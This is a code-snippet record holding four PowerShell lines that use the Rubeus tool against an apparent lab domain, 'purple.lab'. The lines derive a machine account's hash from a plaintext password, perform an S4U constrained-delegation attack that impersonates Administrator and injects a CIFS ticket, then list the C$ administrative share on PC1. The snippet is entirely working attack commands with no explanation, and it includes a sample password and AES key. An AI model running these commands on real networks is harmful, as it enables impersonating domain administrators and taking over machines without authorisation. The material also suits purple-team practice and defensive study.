---
id: 85efb9b3-e79a-4e4f-b049-fd0a3231e57c
type: code
language: ps1
verified: false
created_at: '2023-04-06T03:56:05.672688+00:00'
updated_at: '2023-04-10T20:36:04.067225+00:00'
---

# Code Snippet 85efb9b3

**Language**: ps1

```ps1
.\Rubeus.exe hash /domain:purple.lab /user:WVLFLLKZ$ /password:'iUAL)l<i$;UzD7W'
.\Rubeus.exe s4u /user:WVLFLLKZ$ /aes256:E0B3D87B512C218D38FAFDBD8A2EC55C83044FD24B6D740140C329F248992D8F /impersonateuser:Administrator /msdsspn:host/pc1.purple.lab /altservice:cifs /nowrap /ptt
ls \\PC1.purple.lab\c$
# IP of PC1: 10.0.0.4
```


